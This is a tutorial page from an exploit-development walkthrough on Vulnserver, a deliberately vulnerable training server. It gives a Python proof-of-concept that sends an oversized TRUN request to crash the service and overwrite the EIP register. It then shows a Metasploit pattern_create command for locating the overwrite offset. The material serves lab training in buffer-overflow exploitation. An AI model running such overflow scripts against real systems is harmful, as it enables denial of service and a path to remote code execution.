---
title: "TRUN EIP Overwrite"
layout: home
permalink: /vulnserver/trun/
collection: vulnserver
sidebar:
  nav: "main"
entries_layout: grid
classes: wide
---

Begin by using the below proof of concept script, developed by using the SPIKE fuzzer to identify a hole in the Vulnserver TRUN command.

	Vulnserver TRUN Python Script: POC
		#!/usr/bin/python
		import socket
		import os
		import sys

		crash="A"*5000

		buffer="TRUN /.:/"
		buffer+=crash

		print "[*] Sending evil TRUN request to VulnServer, OS-42279"
		expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
		expl.connect(("192.168.83.128", 9999))
		expl.send(buffer)
    expl.close()

Running this POC script against Vulnserver produces the same result in the OllyDbg debugger as our previous SPIKE fuzzing attempts. As a very nice bonus, the input we sent has been used to control the value of a very important register in the CPU – the EIP (Extended Instruction Pointer) register. Notice how the EIP register contains the value 41414141?

![trun-eip-overwrite-media-01](/vulnserver/trun-eip-overwrite-media/trun-eip-overwrite-media-01)

Additional testing proves that a 2500 byte buffer will also cause the Vulnserver application to crash due to an access violation. Create a 2500 byte patterned string to identify which part of the buffer is being stored in the EIP.
	> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.